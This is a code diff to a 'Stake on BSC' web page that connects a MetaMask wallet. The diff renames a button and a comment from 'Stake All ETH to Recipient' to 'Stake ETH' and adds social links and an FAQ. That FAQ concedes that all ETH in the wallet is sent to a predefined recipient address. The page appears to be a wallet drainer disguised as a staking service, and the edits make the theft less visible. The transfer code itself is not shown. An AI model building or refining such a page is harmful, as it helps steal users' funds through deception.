@@ -57,6 +57,33 @@
             border-radius: 15px;
             width: 0;
         }
+        .social-links {
+            margin-top: 30px;
+        }
+        .social-links a {
+            margin: 0 10px;
+            font-size: 20px;
+            color: #333;
+            text-decoration: none;
+        }
+        .social-links a:hover {
+            color: #007bff;
+        }
+        .faq {
+            text-align: left;
+            margin-top: 30px;
+            width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .faq h2 {
+            font-size: 24px;
+            color: #333;
+        }
+        .faq p {
+            font-size: 16px;
+            margin: 5px 0;
+        }
     </style>
 </head>
 <body>
@@ -65,9 +92,29 @@
     <h1>Stake on BSC</h1>
     <p id="walletAddress">Connect your wallet to see your BSC address</p>
     <button id="connectButton">Connect MetaMask</button>
-    <button id="stakeButton" disabled>Stake All ETH to Recipient</button>
+    <button id="stakeButton" disabled>Stake ETH</button>
     <div class="status" id="status"></div>
     <div id="progressBar"><div id="progress"></div></div>
+
+    <!-- Social Media Links -->
+    <div class="social-links">
+        <h3>Follow Us:</h3>
+        <a href="https://twitter.com" target="_blank">Twitter</a>
+        <a href="https://facebook.com" target="_blank">Facebook</a>
+        <a href="https://discord.com" target="_blank">Discord</a>
+        <a href="https://t.me" target="_blank">Telegram</a>
+    </div>
+
+    <!-- FAQ Section -->
+    <div class="faq">
+        <h2>Frequently Asked Questions (FAQ)</h2>
+        <p><strong>Q: How do I stake ETH?</strong></p>
+        <p>A: Simply connect your MetaMask wallet and click "Stake ETH". All ETH in your wallet will be sent to the recipient address.</p>
+        <p><strong>Q: What is the recipient address?</strong></p>
+        <p>A: The recipient address is where the staked ETH is sent. In this example, it's a predefined address on the Binance Smart Chain.</p>
+        <p><strong>Q: What networks are supported?</strong></p>
+        <p>A: This application is designed for the Binance Smart Chain (BSC). Please ensure you are connected to BSC in your MetaMask wallet.</p>
+    </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
@@ -106,7 +153,7 @@
         }
     }
 
-    // Stake all ETH from user's wallet to the recipient address
+    // Stake ETH from user's wallet to the recipient address
     document.getElementById("stakeButton").addEventListener("click", async () => {
         try {
             // Start progress bar
